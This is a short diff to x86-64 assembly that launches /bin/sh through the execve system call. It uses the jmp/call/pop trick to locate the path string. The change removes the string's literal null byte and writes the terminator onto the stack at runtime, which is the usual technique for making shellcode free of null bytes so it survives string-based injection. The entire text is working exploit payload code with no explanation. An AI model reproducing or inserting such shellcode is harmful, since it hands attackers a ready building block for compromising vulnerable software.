@@ -3,11 +3,17 @@
 _start:
 	movq %rsp,%rbp
 	pushq %rbx
+	sub $32,%rsp
 	jmp Temp
 Cont:
 	popq %rbx
-	movq %rbx,%rdi		#pointer to hard coded shell path
+	movq (%rbx),%rcx
+	movq %rcx,32(%rsp)
+	leaq 32(%rsp),%rbx
+	xorq %rdi,%rdi
 	xorq %rax,%rax
+	movb %al,7(%rbx)
+	movq %rbx,%rdi		#pointer to hard coded shell path
 	movb $59,%al
 	xorq %rsi,%rsi
 	movq %rsi,%rdx
@@ -19,5 +25,5 @@ Cont:
 Temp:
 	call Cont
 Path: 
-.ascii "/bin/sh\0"
+.ascii "/bin/sh"
 
